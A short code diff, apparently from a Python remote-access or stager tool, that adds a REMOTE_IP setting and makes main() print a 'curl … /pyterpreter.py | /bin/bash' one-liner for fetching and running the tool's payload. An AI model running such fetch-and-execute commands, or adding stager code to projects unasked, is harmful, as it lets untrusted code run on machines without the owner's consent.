@@ -14,6 +14,8 @@ import web_server
 from pyterpreter import Message
 from port_manager import PortManager
 
+
+REMOTE_IP = 'localhost'
 logger = my_logging.Logger('APP')
 
 
@@ -143,6 +145,7 @@ class App():
 
 
 def main():
+    print(f'curl {REMOTE_IP}:{web_server.PORT}/pyterpreter.py | /bin/bash')
     web_server.start(should_wait=False)
     stager.initialise()
     InstanceManager.start_worker()
